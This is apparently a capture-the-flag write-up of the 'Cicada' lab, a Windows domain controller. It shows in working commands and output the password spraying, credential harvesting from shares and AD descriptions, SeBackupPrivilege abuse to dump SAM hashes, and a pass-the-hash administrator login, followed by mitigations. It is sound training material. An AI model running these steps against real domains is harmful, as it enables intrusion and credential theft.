## At a Glance

Cicada is a Windows Active Directory machine that perfectly models the dangers of a "death by a thousand cuts." There's no single, complex exploit. Instead, the path to root is a chain of cascading misconfigurations.

My attack path started with enumerating SMB shares, where `guest` access let me into an `HR` share. I found a plaintext default password in a text file there. With this password, I needed usernames, which I gathered by performing RID cycling (also enabled by my `guest` access).

A password spray against the user list landed my initial foothold. From there, it was a game of "user hopping": I used my new access to find a second password in an AD user's description, and those credentials led me to a `DEV` share. In that share, a PowerShell script contained a third hardcoded password. This final user, `emily.oscars`, was a member of the `Backup Operators` group, granting me `SeBackupPrivilege`. I used this privilege to exfiltrate the SAM and SYSTEM registry hives, dumped the Administrator's NTLM hash, and used a Pass-the-Hash attack to gain a system-level shell.

---

## Enumeration & Reconnaissance

### Nmap Scan

I kick things off with an `nmap` scan. I'm looking for the primary services that define the machine.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ sudo nmap -sC -sV 10.129.231.149
[sudo] password for m4ias7ru: 
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-13 01:50 EST
Nmap scan report for 10.129.231.149
Host is up (0.070s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-13 13:50:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-11-13T13:52:05+00:00; +6h59m58s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T13:52:05+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: 2025-11-13T13:52:05+00:00; +6h59m58s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-13T13:52:05+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-13T13:51:28
|_  start_date: N/A
````

:::info[Nmap Flags Explained]
`-sC`: Run default scripts<br />
`-sV`: Enumerate service versions
:::

The output is classic Active Directory. I see Kerberos (88), LDAP/S (389/636), and SMB (445). This tells me it's a Domain Controller. The hostname `CICADA-DC.cicada.htb` confirms it. I also file away port 5985 (WinRM), as that's my preferred method for a shell if I get credentials.

:::tip[Workflow]
My first action is to add `CICADA-DC.cicada.htb` and `cicada.htb` to my `/etc/hosts` file.
:::

### SMB Enumeration

With a DC, my first point of attack is SMB. I'll start by probing for shares.

#### Listing Shares

My first attempt is an anonymous (null) session. It's low-hanging fruit.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 --shares
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

`STATUS_USER_SESSION_DELETED` means no anonymous access. This is expected and properly configured.

My next check is the other classic misconfiguration: `guest` access with a blank password.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'guest' -p '' --shares
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB        10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB        10.129.231.149  445    CICADA-DC        Share          Permissions   Remark
SMB        10.129.231.149  445    CICADA-DC        -----          -----------   ------
SMB        10.129.231.149  445    CICADA-DC        ADMIN$                       Remote Admin
SMB        10.129.231.149  445    CICADA-DC        C$                           Default share
SMB        10.129.231.149  445    CICADA-DC        DEV                          
SMB        10.129.231.149  445    CICADA-DC        HR             READ          
SMB        10.129.231.149  445    CICADA-DC        IPC$           READ          Remote IPC
SMB        10.129.231.149  445    CICADA-DC        NETLOGON                     Logon server share 
SMB        10.129.231.149  445    CICADA-DC        SYSVOL                       Logon server share
```

And we're in. The `guest` account is enabled, and it has `READ` access to a share named `HR`.

#### Exploring the HR Share

I immediately connect to this `HR` share with `smbclient` to see what's inside.

```plaintext {1,2,5,11}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ smbclient -U 'guest' //10.129.231.149/HR
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Mar 14 08:29:09 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024

  4168447 blocks of size 4096. 471597 blocks available
```

The share contains a single file, `Notice from HR.txt`. The name alone is promising. I download it with `get`.

```plaintext {1}
smb: \> get "Notice from HR.txt"
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (7.9 KiloBytes/sec) (average 7.9 KiloBytes/sec)
```

Let's see what's inside.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```

:::info[Default Password Found]
The HR department is leaking the default password for all new hires in a publicly readable text file.<br />Our password is: `Cicada$M6Corpb*@Lp#nZp!8`.
:::

A password is only half the equation. I now need to find a list of valid usernames to spray this password against.

#### RID Cycling

My low-privilege `guest` access is still useful, I can perform RID cycling to enumerate domain users. `nxc` can automate this.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB        10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB        10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB        10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB        10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB        10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB        10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB        10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB        10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

This gives me a nice list of all `(SidTypeUser)` accounts. I'll use `awk` to parse this output and save just the usernames to a file.

```plaintext {1,2,4,5}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute | awk '/SidTypeUser/ { sub(/.*\\/, ""); sub(/ .*/, ""); print }' > users.txt

┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ cat users.txt 
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

This `users.txt` file is now my target list.

---

## User Compromise

### Password Spraying

I now have the two key ingredients: a list of usernames (`users.txt`) and a default password (`Cicada$M6Corpb*@Lp#nZp!8`). It's time for a password spray.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8
```

:::info[Foothold Gained: Michael Wrightson]
Success\! I get a `[+]` on `michael.wrightson`. This confirms the default password was still active for this account. This is my initial foothold.
:::

### Internal Recon (as michael.wrightson)

Now that I'm an authenticated user, my first move is to re-enumerate everything. As `michael.wrightson`, I can likely read more AD attributes than I could as `guest`. I'll run `nxc` again with the `--users` flag.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB        10.129.231.149  445    CICADA-DC        -Username-           -Last PW Set-         -BadPW- -Description-                                   
SMB        10.129.231.149  445    CICADA-DC        Administrator        2024-08-26 20:08:03 1       Built-in account for administering the computer/domain 
SMB        10.129.231.149  445    CICADA-DC        Guest                2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain 
SMB        10.129.231.149  445    CICADA-DC        krbtgt               2024-03-14 11:14:10 1       Key Distribution Center Service Account 
SMB        10.129.231.149  445    CICADA-DC        john.smoulder        2024-03-14 12:17:29 1       
SMB        10.129.231.149  445    CICADA-DC        sarah.dantelia       2024-03-14 12:17:29 1       
SMB        10.129.231.149  445    CICADA-DC        michael.wrightson    2024-03-14 12:17:29 0       
SMB        10.129.231.149  445    CICADA-DC        david.orelious       2024-03-14 12:17:29 0       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB        10.129.231.149  445    CICADA-DC        emily.oscars         2024-08-22 21:20:17 0       
SMB        10.129.231.149  445    CICADA-DC        [*] Enumerated 8 local users: CICADA
```

:::info[Password in AD Description]
Right in the AD description field for `david.orelious`, there's a plaintext password: `Just in case I forget my password is aRt$Lp#7t*VQ!3`. This is a painful security failure.
:::

### Internal Recon (as david.orelious)

I now have a new set of credentials. I'll repeat the process: enumerate shares as `david.orelious`.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB        10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB        10.129.231.149  445    CICADA-DC        Share          Permissions   Remark
SMB        10.129.231.149  445    CICADA-DC        -----          -----------   ------
SMB        10.129.231.149  445    CICADA-DC        ADMIN$                       Remote Admin
SMB        10.129.231.149  445    CICADA-DC        C$                           Default share
SMB        10.129.231.149  445    CICADA-DC        DEV            READ          
SMB        10.129.231.149  445    CICADA-DC        HR             READ          
SMB        10.129.231.149  445    CICADA-DC        IPC$           READ          Remote IPC
SMB        10.129.231.149  445    CICADA-DC        NETLOGON       READ          Logon server share 
SMB        10.129.231.149  445    CICADA-DC        SYSVOL         READ          Logon server share
```

This user has `READ` access to a new share: `DEV`. I'll connect and see what's inside.

```plaintext {1,2,4}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ smbclient -U 'david.orelious%aRt$Lp#7t*VQ!3' //cicada.htb/DEV
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Mar 14 08:31:39 2024
  ..                                  D        0  Thu Mar 14 08:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 13:28:22 2024

  4168447 blocks of size 4096. 471244 blocks available
```

Another interesting file. I grab `Backup_script.ps1` and examine it.

```plaintext {1}
smb: \> get Backup_script.ps1
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (3.6 KiloBytes/sec) (average 3.6 KiloBytes/sec)
```

:::tip
If a share has multiple files and directories, set `prompt OFF` (to stop it from asking "yes/no" for every file), `recurse ON` (to dig into directories), and then run `mget *` to download everything at once.
:::

Let's see what's inside.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

:::info[Credentials Acquired: Emily Oscars]
And there it is. A third set of credentials, this time for `emily.oscars`, hard-coded into a PowerShell script: `Q!3@Lp#M6b*7t*Vt`.
:::

### Shell as Emily

I now have credentials for `emily.oscars`. I'll check her permissions and then go for the WinRM shell.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares
SMB        10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False) 
SMB        10.129.231.149  445    CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt 
SMB        10.129.231.149  445    CICADA-DC        [*] Enumerated shares
SMB        10.129.231.149  445    CICADA-DC        Share          Permissions   Remark
SMB        10.129.231.149  445    CICADA-DC        -----          -----------   ------
SMB        10.129.231.149  445    CICADA-DC        ADMIN$         READ          Remote Admin
SMB        10.129.231.149  445    CICADA-DC        C$             READ,WRITE    Default share
SMB        10.129.231.149  445    CICADA-DC        DEV                          
SMB        10.129.231.149  445    CICADA-DC        HR             READ          
SMB        10.129.231.149  445    CICADA-DC        IPC$           READ          Remote IPC
SMB        10.129.231.149  445    CICADA-DC        NETLOGON       READ          Logon server share 
SMB        10.129.231.149  445    CICADA-DC        SYSVOL         READ          Logon server share
```

Emily has `READ,WRITE` access to `C$`. I'll use `evil-winrm` to get a shell.

```plaintext {1,2,11,12,23}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ evil-winrm -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
        
Evil-WinRM shell v3.7
        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
        
Data: For more information, check Evil-WinRM GitHub: [https://github.com/Hackplayers/evil-winrm#Remote-path-completion](https://github.com/Hackplayers/evil-winrm#Remote-path-completion)
        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> dir


    Directory: C:\Users\emily.oscars.CICADA\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/13/2025   5:32 AM             34 user.txt


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
93490a3f************************
```

And I got the user flag.

---

## Privilege Escalation

### Privilege Analysis

Now that I have a shell, let's find out more about this user.

```plaintext {1}
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> net user emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 1:20:17 PM
Password expires             Never
Password changeable          8/23/2024 1:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/13/2025 12:38:39 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

My eyes go straight to `Local Group Memberships: *Backup Operators`.

According to [Microsoft Docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators):
> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. 

> By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.

> Although members of this group can't change server settings or modify the configuration of the directory, they do have the permissions needed to replace files (including OS files) on domain controllers. Because members of this group can replace files on domain controllers, they're considered to be service administrators.

I run `whoami /priv` to confirm.

```plaintext {1}
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                     State
============================= =============================== =======
SeBackupPrivilege             Back up files and directories   Enabled
SeRestorePrivilege            Restore files and directories   Enabled
SeShutdownPrivilege           Shut down the system            Enabled
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set  Enabled
```

:::info[Escalation Path: SeBackupPrivilege]
This is the path to root: `SeBackupPrivilege` is enabled.

I can abuse it to get the most sensitive files on the system: the `SAM` and `SYSTEM` registry hives.
:::

### Abusing SeBackupPrivilege

The `SAM` hive contains the encrypted NTLM password hashes for all local users (including the Administrator). The `SYSTEM` hive contains the boot key needed to decrypt them. I'll use `reg save` to create a copy of these locked files in Emily's desktop folder, where I have write access.

```plaintext {1,4}
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> reg save hklm\system system
The operation completed successfully.
```

Now I just use `evil-winrm`'s built-in `download` command to pull them to my local attacker machine.

```plaintext {1,6}
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download sam
        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\sam to sam
        
Info: Download successful!
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> download system
        
Info: Downloading C:\Users\emily.oscars.CICADA\Desktop\system to system
        
Info: Download successful!
```

### Dumping Hashes

With the `sam` and `system` hives on my local machine, the hard part is over. I'll use Impacket's `secretsdump.py` to dump the hashes.

```plaintext {1,2}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ impacket-secretsdump -sam sam -system system local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

The Administrator's NTLM hash is `2b87e7c93a3e8a0ea4a581937016f341`.

### Pass-the-Hash

I don't need to crack this hash. I can use it directly in a Pass-the-Hash (PtH) attack. `evil-winrm` supports this natively with the `-H` flag.

```plaintext {1,2,11,12,23}
┌──(m4ias7ru㉿kali)-[/home/kali/Desktop/Cicada]
└─$ evil-winrm -i cicada.htb -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
        
Evil-WinRM shell v3.7
        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
        
Data: For more information, check Evil-WinRM GitHub: [https://github.com/Hackplayers/evil-winrm#Remote-path-completion](https://github.com/Hackplayers/evil-winrm#Remote-path-completion)
        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        11/13/2025   5:32 AM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
9dc3fab2************************
```

Authentication is successful. I am now `Administrator` and have full system privileges. I grab the root flag, and the machine is done.

---

## Attack Path Visual Summary

```mermaid
---
config:
  theme: 'dark'
  themeVariables:
    lineColor: '#9fef00'
    primaryBorderColor: '#9fef00'
---
flowchart TD

    %% =========================
    %% Node Classes
    %% =========================
    classDef milestone fill:#0f0f0f,stroke:#9fef00,stroke-width:1px,color:#9fef00;
    classDef finding fill:#0f0f0f,stroke:#9fef00,stroke-dasharray: 6 3,color:#9fef00;
    classDef final fill:#9fef00,stroke:#0f0f0f,stroke-width:1px,color:#0f0f0f;

    %% =========================
    %% Nodes
    %% =========================
    A(Attacker Machine):::milestone
    B(("SMB (TCP/445) Exposed")):::finding

    C(SMB Guest Access):::milestone
    D((Default Password)):::finding
    E((User List)):::finding

    F(User: michael.wrightson):::milestone
    G((Password in AD Description)):::finding

    H(User: david.orelious):::milestone
    I((Hardcoded Credentials in PowerShell Script)):::finding

    J(User: emily.oscars):::milestone
    K((SeBackupPrivilege)):::finding
    L((Administrator NTLM Hash)):::finding

    M(User: Administrator):::final

    %% =========================
    %% Flows
    %% =========================
    A --> |Nmap Port Scan| B
    B --> |Check Guest Authentication| C

    C -->|Access HR Share & Get File| D
    C -->|Perform RID Cycling| E

    D & E -->|Password Spray| F

    F -->|Enumerate AD User Attributes| G
    G -->|Use Credentials| H

    H -->|Access DEV Share & Read Script| I
    I -->|Use Credentials| J

    J -->|Identify Privilege| K
    K -->|Abuse to Exfiltrate SAM & SYSTEM Registry Hives and Dump Hashes| L

    L -->|Pass-the-Hash| M
```


---

## Mitigation Steps

- **SMB Hardening:** Disable guest and anonymous access to all SMB shares. `NullSessionPipes` and `NullSessionShares` should be strictly controlled.
- **Password Policies:** Implement strong password policies that force password changes on first login. Never store default passwords in files on a network share.
- **AD Auditing:**
  - Actively audit and enforce policies against storing sensitive information (especially passwords) in AD attributes like `description` or `info`.
  - Hard-coded credentials must be removed from scripts. Use gMSAs (Group Managed Service Accounts) or a dedicated secrets vault for service account authentication.
- **Principle of Least Privilege:**
  - The `SeBackupPrivilege` is effectively equivalent to administrative access. It should **never** be granted to a standard user account.
  - This privilege should be restricted *only* to dedicated service accounts used exclusively for backup operations, which should be heavily monitored.